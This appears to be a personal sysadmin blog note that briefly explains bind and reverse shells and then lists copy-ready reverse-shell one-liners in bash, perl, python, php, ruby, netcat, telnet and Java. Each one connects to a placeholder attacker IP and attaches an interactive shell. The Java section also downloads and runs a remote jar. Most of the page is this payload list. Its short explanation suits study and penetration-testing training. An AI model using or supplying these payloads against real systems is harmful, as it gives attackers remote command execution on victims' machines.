---
title: Linux - reverse shell & Bind shell
date: 2020-11-01 11:11:11 -0400
categories: [30System, Sysadmin]
tags: [Linux, Sysadmin]
math: true
image:
---

[toc]

---

# Bind shell

Bind shell
- attacker's machine acts as a client
- victim's machine acts as a server opening up a communication port on the victim and waiting for the client to connect to it
- and then attacker issue commands that will be remotely executed on the victim's machine.

> This would be only possible if the victim's machine has a public IP and is accessible over the internet (disregarding all firewall etc. for the sake of brevity).


what if the victim's machine is NATed and hence not directly reachable ?
- attacker's machine is reachable.
- So attacker open a server and let the victim connect to him.
- This is what a reverse shell is.

---

# reverse shell

Reverse Shell
- attacker's machine (has a public IP and is reachable over the internet) acts as a server.
- It opens a communication channel on a port and waits for incoming connections.
- Victim's machine acts as a client and initiates a connection to the attacker's listening server.

Open two tabs in your terminal.
1. open TCP port 8080 and wait for a connection:
2. `nc localhost -lp 8080`
3. Open an interactive shell, and redirect the IO streams to a TCP socket:
4. `bash -i >& /dev/tcp/localhost/8080 0>&1`


```bash

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1;

# bash -i "If the -i option is present, the shell is interactive."

# >& "redirects both, stdout and stderr to the specified target."

# (argument for >&) /dev/tcp/localhost/8080 is a TCP client connection to localhost:8080.

# 0>&1 redirect file descriptor 0 (stdin) to fd 1 (stdout), hence the opened TCP socket is used to read input.

```

perl shell

```perl
perl -e 'use Socket;$i="1.1.1.1";$p=10086;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
```

python shell

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.1.1.1",10086));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
```

php shell

```php
php -r '$sock=fsockopen("1.1.1.1",10086);exec("/bin/sh -i <&3 >&3 2>&3");';
```

ruby shell

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("1.1.1.1","10086");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
```

nc shell

```bash
nc -c /bin/sh 1.1.1.1 10086;
```

telnet shell

```
telnet 1.1.1.1 10086 | /bin/bash | telnet 1.1.1.1 10087; # Remember to listen on your machine also on port 4445/tcp

127.0.0.1; mknod test p ; telnet 1.1.1.1 10086 0<test | /bin/bash 1>test;
```

java jar shell

```java
wget http://1.1.1.1:9999/revs.jar -O /tmp/revs1.jar;

java -jar /tmp/revs1.jar;

import java.io.IOException;
public class ReverseShell {
    public static void main(String[] args) throws IOException, InterruptedException {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/1.1.1.1/10086;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```


---

ref
- [example](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)
- [2](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

.
